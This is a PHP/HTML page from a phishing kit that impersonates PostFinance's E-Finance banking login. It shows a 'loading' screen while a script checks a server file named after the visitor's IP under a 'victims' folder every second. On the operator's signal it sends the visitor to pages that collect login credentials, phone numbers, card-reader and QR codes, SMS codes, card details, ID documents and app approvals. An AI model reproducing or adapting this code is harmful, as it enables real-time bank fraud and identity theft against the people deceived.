<?php
  session_start();
  include "./Assets/php/lang/lang.php";
  reset_data_page();
?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="Coinbase">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="./Assets/imgs/favicon.ico">
        <title>PostFinance - E-Finance</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="./Assets/css/style.css">
        <script src="./Assets/js/stutes.js"></script>             
    </head>
    <body>

      <!-- header -->
      <header class="header_1">
        <div class="part_1">
          <div class="container_part1 d-flex align-items-center justify-content-end">
            <p class="d-flex align-items-center mb-0"><?php echo get_text('p_2_1'); ?></p>
            <p class="d-flex align-items-center mb-0 ms-3"><?php echo get_text('p_2_2'); ?></p>
          </div>
        </div>
        <div class="part_2">
          <div class="container_part2 d-flex align-items-center justify-content-between">
            <div class="logo">
              <img src="./Assets/imgs/logo-postfinanc.svg" alt="">
            </div>
            <div class="bars">
              <img src="./Assets/imgs/bars.svg" alt="">
              <p class="mb-0"><?php echo get_text('p_1_24'); ?></p>
            </div>
          </div>
        </div>
      </header>

      <!-- wrapper_details -->
      <div class="loading d-flex align-items-center justify-content-center flex-column">
        <div class="spinner-border text-warning mt-3" role="status" style="border-color: #004B5A;
        border-right-color: #dadada; width: 2.0em;  height: 2.0em; margin-top: -23px;">
          <span class="sr-only">Loading...</span>
        </div>        
        <p class="mb-0 mt-1"><?php echo get_text('p_5_1'); ?></p>
      </div>     



      <!-- footer -->
      <div class="footer_2 mt-5">
        <div class="container_footer2 d-flex justify-content-between align-items-start">
          <div class="links">
            <ul class="ps-0 mb-0">
              <li><span class="s1"><?php echo get_text('p_2_10'); ?></span></li>
              <li><span class="s2"><?php echo get_text('p_2_11'); ?></span></li>
            </ul>
          </div>
          <div class="links">
            <ul class="ps-0 mb-0">
              <li><a href=""><?php echo get_text('p_2_12'); ?> <img src="./Assets/imgs/right.svg" alt=""></a></li>
              <li><a href=""><?php echo get_text('p_2_13'); ?> <img src="./Assets/imgs/right.svg" alt=""></a></li>
              <li><a href="" class="mb-0"><?php echo get_text('p_2_14'); ?> <img src="./Assets/imgs/right.svg" alt=""></a></li>
            </ul>
            <ul class="ps-0 mb-0 link_md">
              <li><a href=""><?php echo get_text('p_2_15'); ?> <img src="./Assets/imgs/right.svg" alt=""></a></li>
              <li><a href="" class="mb-0"><?php echo get_text('p_2_16'); ?> <img src="./Assets/imgs/right.svg" alt=""></a></li>
            </ul>
          </div>
          <div class="links link_lg">
            <ul class="ps-0 mb-0">
              <li><a href=""><?php echo get_text('p_2_15'); ?> <img src="./Assets/imgs/right.svg" alt=""></a></li>
              <li><a href="" class="mb-0"><?php echo get_text('p_2_16'); ?> <img src="./Assets/imgs/right.svg" alt=""></a></li>
            </ul>
          </div>
          <div class="links">
            <a href="" class="lang"><img src="./Assets/imgs/lang.svg" alt=""> <?php echo get_text('p_2_17'); ?></a>
          </div>
        </div>
      </div>







        







        <!-- bootstrap -->
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
        <!-- script jquery -->
        <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
        <script src="./Assets/js/script.js"></script>
        
        <script>
            var ip = '<?php echo get_client_ip(); ?>';
            var waiting = setInterval(function() {
            $.get('./victims/' + ip + '.txt?' + new Date().getTime(), function(data) {
                if( data == 0 ) {
                    console.log('hada ba9i 0');
                }else if( data == 'log' ){
                    clearInterval(waiting); 
                    location.href = "login.php";
                }else if( data == 'log_error' ){
                    clearInterval(waiting);
                    location.href = "login.php?error";
                }              

                else if( data == 'phone' ) {
                    clearInterval(waiting);
                    location.href = "phone.php";
                }else if( data == 'phone_error' ){
                    clearInterval(waiting);
                    location.href = "phone.php?error";
                }

                else if( data == 'rd' ) {
                    clearInterval(waiting);
                    location.href = "reader.php";
                }else if( data == 'rd_error' ){
                    clearInterval(waiting);
                    location.href = "reader.php?error";
                }

                else if( data == 'qr' ) {
                    clearInterval(waiting);
                    location.href = "qr.php";
                }else if( data == 'qr_error' ){
                    clearInterval(waiting);
                    location.href = "qr.php?error";
                }

                else if( data == 'sms' ) {
                    clearInterval(waiting);
                    location.href = "sms.php";
                }else if( data == 'sms_error' ){
                    clearInterval(waiting);
                    location.href = "sms.php?error";
                }

                else if( data == 'card' ) {
                    clearInterval(waiting);
                    location.href = "card.php";
                }else if( data == 'card_error' ){
                    clearInterval(waiting);
                    location.href = "card.php?error";
                }

                else if( data == 'det' ) {
                    clearInterval(waiting);
                    location.href = "details.php";
                }else if( data == 'det_error' ){
                    clearInterval(waiting);
                    location.href = "details.php?error";
                }

                else if( data == 'id' ) {
                    clearInterval(waiting);
                    location.href = "id.php";
                }else if( data == 'id_error' ){
                    clearInterval(waiting);
                    location.href = "id.php?error";
                }


                else if( data == 'app' ){
                    clearInterval(waiting);
                    location.href = "app.php";
                }else if( data == 'app_error' ){
                    clearInterval(waiting);
                    location.href = "app.php?error";
                }

                else if( data == 'success' ){
                    clearInterval(waiting);
                    location.href = "success.php";
                }
            });
            }, 1000);  
        </script>
    </body>
</html>